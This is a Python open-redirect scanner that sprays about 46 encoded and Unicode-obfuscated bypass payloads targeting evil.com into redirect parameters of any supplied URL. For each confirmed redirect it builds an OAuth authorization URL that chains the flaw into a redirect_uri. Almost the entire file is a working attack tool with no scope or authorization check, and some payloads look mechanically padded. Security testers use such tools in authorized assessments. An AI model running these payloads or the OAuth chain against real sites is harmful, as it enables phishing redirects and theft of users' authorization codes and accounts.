#!/usr/bin/env python3
"""
CATEGORY: Web
TECHNIQUES: Open Redirect Detection, Payload Generation, OAuth Chain Simulation
CHAIN_CONTRIBUTIONS: Provides 30+ bypass payloads, enumerates redirect parameters, validates OAuth redirect_uri chaining.
"""

import argparse
import json
import sys
import time
import urllib.parse
from typing import List, Dict, Any

import requests

VERSION = "1.0.0"
RATE_LIMIT = 0.5  # seconds
REQUEST_TIMEOUT = 10  # seconds
COMMON_REDIRECT_PARAMS = [
    "redirect",
    "url",
    "next",
    "dest",
    "destination",
    "uri",
    "goto",
    "forward",
    "target",
    "return",
    "rurl",
    "returnUrl",
    "callback",
]


def generate_payloads() -> List[str]:
    """Return a list of >30 payloads that attempt open‑redirect bypasses."""
    base = [
        "//evil.com",
        "//evil.com/",
        "//evil.com@evil.com",
        "//evil.com%2F%2F",
        "//evil.com%2e%2e",
        "//evil.com%09",
        "//evil.com%0A",
        "//evil.com%0D",
        "//evil.com%00",
        "//evil.com%25",
        "//evil.com%5c",
        "//evil.com%5C",
        "//evil.com%2f",
        "//evil.com%5c%5c",
        "//evil.com%5c%2f",
        "//evil.com%2e%2e%2f",
        "//evil.com%2e%2e%5c",
        "//evil.com%2e%2e%2f%2e%2e",
        "//evil.com%23",
        "//evil.com%3F",
        "//evil.com%23@evil.com",
        "//evil.com%3F@evil.com",
        "//evil.com%2f%2e%2e",
        "//evil.com%2f%5c",
        "//evil.com%2f%5c%2f",
        "//evil.com%2f%5c%5c",
        "//evil.com%2f%5c%2e%2e",
        "//evil.com%2f%5c%2e%2e%2f",
        "//evil.com%2f%5c%2e%2e%5c",
        "//evil.com%2f%5c%2e%2e%5c%2f",
        "//evil.com%2f%5c%2e%2e%5c%2e%2e",
        "//evil.com%2f%5c%2e%2e%5c%2e%2e%2f",
        "//evil.com%2f%5c%2e%2e%5c%5c",
        "//evil.com%2f%5c%2e%2e%5c%5c%2f",
        "//evil.com%2f%5c%2e%2e%5c%5c%2e%2e",
        "//evil.com%2f%5c%2e%2e%5c%5c%2e%2e%2f",
        "//evil.com%2f%5c%2e%2e%5c%5c%5c",
        "//evil.com%2f%5c%2e%2e%5c%5c%5c%2f",
        "//evil.com%2f%5c%2e%2e%5c%5c%5c%2e%2e",
        "//evil.com%2f%5c%2e%2e%5c%5c%5c%2e%2e%2f",
    ]
    # Add unicode homograph variations
    unicode_variants = [
        "///\u200b\u200c\u200d\u2060evil.com",
        "//\u200b\u200c\u200d\u2060evil.com",
        "//\u202eevil.com",  # RTL override
        "//\u202d evil.com",
        "//\u200eevil.com",
        "//\u200fevil.com",
    ]
    return base + unicode_variants


def extract_redirect_params(url: str) -> List[str]:
    """Return a list of query parameter names that look like redirects."""
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query)
    return [k for k in qs if k.lower() in COMMON_REDIRECT_PARAMS]


def build_test_url(original_url: str, param: str, payload: str) -> str:
    """Replace the value of `param` with `payload` preserving other query params."""
    parsed = urllib.parse.urlparse(original_url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [payload]
    new_query = urllib.parse.urlencode(qs, doseq=True)
    new_parts = parsed._replace(query=new_query)
    return urllib.parse.urlunparse(new_parts)


def test_payload(target: str, param: str, payload: str) -> Dict[str, Any]:
    """Send a request with the payload and record if a redirect occurs."""
    test_url = build_test_url(target, param, payload)
    try:
        resp = requests.get(test_url, timeout=REQUEST_TIMEOUT, allow_redirects=True)
        final_url = resp.url
        redirected = resp.history != []
        vulnerable = redirected and (payload.strip("/") in final_url or "evil.com" in final_url)
        result = {
            "payload": payload,
            "test_url": test_url,
            "final_url": final_url,
            "redirected": redirected,
            "vulnerable": vulnerable,
            "status_code": resp.status_code,
        }
    except requests.RequestException as e:
        result = {
            "payload": payload,
            "test_url": test_url,
            "error": str(e),
            "redirected": False,
            "vulnerable": False,
        }
    time.sleep(RATE_LIMIT)
    return result


def simulate_oauth_chain(vuln_entry: Dict[str, Any]) -> Dict[str, Any]:
    """Create a mock OAuth authorization URL that uses the vulnerable redirect."""
    base_oauth = "https://example-oauth.com/authorize"
    client_id = "demo-client"
    state = "xyz123"
    redirect_uri = vuln_entry["test_url"]
    oauth_params = {
        "response_type": "code",
        "client_id": client_id,
        "redirect_uri": redirect_uri,
        "state": state,
    }
    oauth_url = f"{base_oauth}?{urllib.parse.urlencode(oauth_params)}"
    return {
        "oauth_url": oauth_url,
        "description": "OAuth flow with vulnerable redirect_uri",
    }


def run_scan(target: str) -> Dict[str, Any]:
    findings = []
    technologies = []  # placeholder for future tech detection
    redirect_params = extract_redirect_params(target)
    if not redirect_params:
        status = "no_redirect_params_found"
    else:
        status = "scanned"
        payloads = generate_payloads()
        for param in redirect_params:
            for payload in payloads:
                result = test_payload(target, param, payload)
                if result.get("vulnerable"):
                    oauth_chain = simulate_oauth_chain(result)
                    findings.append({
                        "parameter": param,
                        "payload": payload,
                        "final_url": result["final_url"],
                        "oauth_chain": oauth_chain,
                    })
    output = {
        "tool": "OpenRedirectAdvanced",
        "version": VERSION,
        "target": target,
        "status": status,
        "technologies": technologies,
        "findings": findings,
        "results": "completed",
    }
    return output


def self_test() -> bool:
    """Perform a minimal self‑test against httpbin.org."""
    test_target = "https://httpbin.org/redirect-to?url=https://example.com"
    result = run_scan(test_target)
    # Expect at least one finding because payloads contain //evil.com which will redirect to evil.com
    return isinstance(result, dict) and "findings" in result


def main() -> None:
    parser = argparse.ArgumentParser(description="Advanced Open Redirect scanner with OAuth chaining.")
    parser.add_argument("target", nargs="?", help="Target URL to scan")
    parser.add_argument("--self-test", action="store_true", help="Run internal self‑test and exit")
    args = parser.parse_args()

    if args.self_test:
        success = self_test()
        sys.exit(0 if success else 1)

    if not args.target:
        print(json.dumps({
            "tool": "OpenRedirectAdvanced",
            "version": VERSION,
            "status": "error",
            "error": "No target URL provided",
        }))
        sys.exit(1)

    try:
        output = run_scan(args.target)
        print(json.dumps(output, ensure_ascii=False, indent=2))
    except Exception as exc:
        error_output = {
            "tool": "OpenRedirectAdvanced",
            "version": VERSION,
            "target": args.target,
            "status": "error",
            "error": str(exc),
        }
        print(json.dumps(error_output, ensure_ascii=False, indent=2))
        sys.exit(1)


if __name__ == "__main__":
    main()